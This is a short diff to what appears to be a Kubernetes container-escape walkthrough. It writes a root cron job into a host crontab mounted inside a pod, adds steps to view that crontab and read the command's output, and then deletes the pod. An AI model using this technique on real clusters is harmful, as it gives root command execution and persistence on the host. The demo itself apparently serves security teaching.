@@ -17,5 +17,9 @@ add commands to run on host
 echo "* * * * * root curl ifconfig.co > /root/data" >> /root/ibm/etc/crontab
 ```
 ```bash
+vim /root/ibm/etc/crontab
+cat /root/ibm/root/data
+```
+```bash
 kubectl delete po ubuntu
 ```
